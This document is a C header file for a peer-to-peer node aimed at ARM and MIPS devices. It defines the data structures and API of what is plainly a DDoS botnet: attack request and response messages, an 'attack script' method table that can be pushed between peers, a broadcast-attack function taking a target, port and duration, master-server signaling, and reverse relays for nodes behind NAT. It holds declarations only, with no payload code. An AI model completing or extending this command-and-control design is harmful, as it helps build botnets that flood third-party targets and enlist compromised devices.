#ifndef P2P_NODE_H
#define P2P_NODE_H

/* ============================================================
 * P2P Hybrid Node - Pure C Implementation
 * Target: ARMv7a, ARMv8, MIPS
 * No external libraries - POSIX sockets only
 * Protocol: Raw TCP with JSON framing (length-prefix)
 * ============================================================ */

#include <stdint.h>
#include <stddef.h>
#include <time.h>
#include <sys/types.h>

/* ── Tunables ───────────────────────────────────────────── */
#define P2P_MAX_PEERS          400
#define P2P_MAX_KNOWN_PEERS    2000
#define P2P_NODE_ID_LEN        33        /* 32 hex + NUL */
#define P2P_MSG_MAX            (256*1024) /* 256 KB per message */
#define P2P_QUEUE_MAX          100
#define P2P_BLACKLIST_DURATION 300       /* seconds */
#define P2P_HEARTBEAT_INTERVAL 45        /* seconds */
#define P2P_CLEANUP_INTERVAL   60        /* seconds */
#define P2P_CONN_TIMEOUT       10        /* seconds */
#define P2P_MAX_CONN_ATTEMPTS  3
#define P2P_BACKOFF_BASE       5         /* seconds */
#define P2P_REFERRALS_MAX      5
#define P2P_PERM_LOCK_ATTEMPTS 3
#define P2P_MAX_METHODS        512
#define P2P_METHOD_NAME_LEN    128
#define P2P_METHOD_CMD_LEN     512
#define P2P_VERSION_HASH_LEN   65        /* SHA-256 hex + NUL */
#define P2P_IP_LEN             46
#define P2P_REASON_LEN         128
#define P2P_REQUEST_ID_LEN     33

/* ── Node mode ──────────────────────────────────────────── */
typedef enum {
    NODE_MODE_DIRECT  = 0,
    NODE_MODE_REVERSE = 1,
} NodeMode;

/* ── Peer connection state ──────────────────────────────── */
typedef enum {
    PEER_STATE_DISCONNECTED = 0,
    PEER_STATE_CONNECTING,
    PEER_STATE_CONNECTED,
    PEER_STATE_BLACKLISTED,
    PEER_STATE_PERM_LOCKED,
} PeerState;

/* ── Message types (enum maps to string) ────────────────── */
typedef enum {
    MSG_WELCOME = 0,
    MSG_PING,
    MSG_PONG,
    MSG_PEER_LIST,
    MSG_PEER_REVERSE_LIST,
    MSG_ATTACK_REQUEST,
    MSG_ATTACK_RESPONSE,
    MSG_STATUS_REQUEST,
    MSG_STATUS_RESPONSE,
    MSG_TUNNEL_REQUEST,
    MSG_TUNNEL_RESPONSE,
    MSG_TUNNEL_DELIVERY,
    MSG_RELAY_REQUEST,
    MSG_RELAY_RESPONSE,
    MSG_METHODS_VERSION_QUERY,
    MSG_METHODS_VERSION_RESPONSE,
    MSG_METHODS_REQUEST,
    MSG_METHODS_RESPONSE,
    MSG_METHODS_PUSH,
    MSG_METHODS_UPDATE_NOTIFICATION,
    MSG_FILE_REQUEST,
    MSG_FILE_RESPONSE,
    MSG_CONNECTION_REJECTED,
    MSG_GOODBYE,
    MSG_UNKNOWN,
} MsgType;

/* ── Method (attack script) ─────────────────────────────── */
typedef struct {
    char name[P2P_METHOD_NAME_LEN];
    char cmd[P2P_METHOD_CMD_LEN];
} Method;

/* ── Queued message ─────────────────────────────────────── */
typedef struct {
    char   *data;      /* heap-allocated JSON string */
    size_t  len;
    time_t  ts;
} QueuedMsg;

/* ── Known peer (not necessarily connected) ─────────────── */
typedef struct KnownPeer {
    char     node_id[P2P_NODE_ID_LEN];
    char     ip[P2P_IP_LEN];
    int      port;
    NodeMode mode;
    int      reachable;
    int      can_connect;
    char     methods_version[P2P_VERSION_HASH_LEN];
    int      methods_count;
    time_t   last_update;
    struct KnownPeer *next;  /* hash-map chaining */
} KnownPeer;

/* ── Connected peer ─────────────────────────────────────── */
typedef struct Peer {
    char     node_id[P2P_NODE_ID_LEN];
    char     ip[P2P_IP_LEN];
    int      port;
    int      fd;             /* TCP socket fd */
    NodeMode local_mode;     /* our mode when we connected */
    NodeMode remote_mode;
    int      is_reverse_node;
    int      is_outbound;
    int      is_relay_provider;
    time_t   connected_at;
    time_t   last_seen;
    time_t   last_heartbeat;
    uint64_t msgs_sent;
    uint64_t msgs_recv;

    /* recv buffer */
    char    *recv_buf;
    size_t   recv_buf_len;
    size_t   recv_buf_cap;

    /* per-peer outbound queue */
    QueuedMsg queue[P2P_QUEUE_MAX];
    int        queue_head;
    int        queue_tail;
    int        queue_size;

    char     methods_version[P2P_VERSION_HASH_LEN];
    int      methods_count;
    int      supports_tunnel;

    struct Peer *next; /* hash-map chaining */
} Peer;

/* ── Blacklist entry ────────────────────────────────────── */
typedef struct Blacklist {
    char           node_id[P2P_NODE_ID_LEN];
    time_t         until;
    char           reason[P2P_REASON_LEN];
    struct Blacklist *next;
} Blacklist;

/* ── Permanent lock entry ───────────────────────────────── */
typedef struct PermanentLock {
    char             node_id[P2P_NODE_ID_LEN];
    int              attempts;
    time_t           locked_at;
    struct PermanentLock *next;
} PermanentLock;

/* ── Relay route: reverse_node_id → relay_peer_id ───────── */
typedef struct RelayRoute {
    char  reverse_id[P2P_NODE_ID_LEN];
    char  relay_id[P2P_NODE_ID_LEN];
    struct RelayRoute *next;
} RelayRoute;

/* ── Stats ──────────────────────────────────────────────── */
typedef struct {
    uint64_t direct_connections;
    uint64_t reverse_connections;
    uint64_t msgs_sent;
    uint64_t msgs_recv;
    uint64_t msgs_queued;
    uint64_t msgs_relayed;
    uint64_t peers_discovered;
    uint64_t conn_attempts;
    uint64_t conn_failures;
    uint64_t conn_successes;
    uint64_t tunnel_forwarded;
    uint64_t attacks_broadcast;
    uint64_t attacks_failed;
    uint64_t reverse_handshakes;
    uint64_t permanent_locks;
    uint64_t perm_locks_unlocked;
    uint64_t referrals_sent;
    time_t   last_discovery;
    time_t   last_auto_connect;
} Stats;

/* ── Config ─────────────────────────────────────────────── */
typedef struct {
    char  node_id[P2P_NODE_ID_LEN];
    char  node_ip[P2P_IP_LEN];
    int   node_port;
    NodeMode node_mode;

    /* master signaling */
    char  master_host[P2P_IP_LEN];
    int   master_port;
    int   master_signaling_enabled;
    int   master_signaling_interval; /* seconds */

    /* P2P tuning */
    int   max_peers;
    int   auto_connect;
    int   relay_fallback;
    int   heartbeat_interval;
    int   conn_timeout;
    int   max_conn_attempts;
    int   backoff_base;
    int   blacklist_duration;
    int   discovery_interval;
    int   cleanup_interval;
    int   auto_connect_delay;
    int   reverse_reconnect_interval;

    /* encryption shared secret (simple XOR-AES substitute or plain) */
    char  shared_secret[256];
    int   encryption_enabled;

    /* DHT */
    int   dht_enabled;
} Config;

/* ── Main node handle ───────────────────────────────────── */
typedef struct P2PNode {
    Config   cfg;
    NodeMode mode;

    int      listen_fd;   /* TCP server socket */
    int      server_ready;
    int      shutting_down;

    /* Connected peers hash-map (by node_id, 256 buckets) */
    Peer    *peers[256];
    int      peer_count;

    /* Known peers hash-map */
    KnownPeer *known_peers[256];
    int        known_peer_count;

    /* Reverse peers set (node_id → fd) stored in peers map, flagged */
    /* relay routes */
    RelayRoute *relay_routes[256];

    /* Blacklist */
    Blacklist    *blacklist[256];

    /* Permanent locks */
    PermanentLock *perm_locks[256];

    /* Outbound failure counts (simple parallel array) */
    char      fail_id[P2P_MAX_PEERS][P2P_NODE_ID_LEN];
    int       fail_count[P2P_MAX_PEERS];
    int       fail_entries;

    /* Connection locks (node_ids currently being connected) */
    char      conn_lock_id[P2P_MAX_PEERS][P2P_NODE_ID_LEN];
    time_t    conn_lock_ts[P2P_MAX_PEERS];
    int       conn_lock_count;

    /* Methods */
    Method   methods[P2P_MAX_METHODS];
    int      method_count;
    char     methods_version[P2P_VERSION_HASH_LEN];
    time_t   methods_last_update;

    /* Master reachable flag */
    int      master_reachable;
    time_t   last_master_check;

    /* Node reachable flag */
    int      node_reachable;

    /* Stats */
    Stats    stats;

    /* Pending attack request IDs (dedup ring-buffer) */
    char     processed_attacks[1024][P2P_REQUEST_ID_LEN];
    time_t   processed_attacks_ts[1024];
    int      processed_attacks_head;
    int      processed_attacks_count;

    /* epoll / poll fd */
    int      epoll_fd;

} P2PNode;

/* ═══════════════════════════════════════════════════════════
 * Public API
 * ═══════════════════════════════════════════════════════════ */

/* Lifecycle */
P2PNode *p2p_node_create(const Config *cfg);
int      p2p_node_start(P2PNode *n);
void     p2p_node_run(P2PNode *n);   /* blocks — main event loop */
void     p2p_node_shutdown(P2PNode *n);
void     p2p_node_destroy(P2PNode *n);

/* Peer management */
int   p2p_connect_to_peer(P2PNode *n, const char *node_id,
                           const char *ip, int port, NodeMode mode);
int   p2p_send_to_peer(P2PNode *n, const char *node_id,
                        const char *json, size_t len);
int   p2p_broadcast(P2PNode *n, const char *json, size_t len,
                    const char *exclude_id);

/* Attack */
int   p2p_broadcast_attack(P2PNode *n, const char *target,
                            int time_sec, int port, const char *method);

/* Status JSON */
int   p2p_get_status_json(P2PNode *n, char *buf, size_t bufsz);

/* Methods */
int   p2p_load_methods_json(P2PNode *n, const char *path);
void  p2p_update_methods_version(P2PNode *n);

/* Master signaling (HTTP GET /api/nodes) */
int   p2p_do_master_signaling(P2PNode *n);

#endif /* P2P_NODE_H */
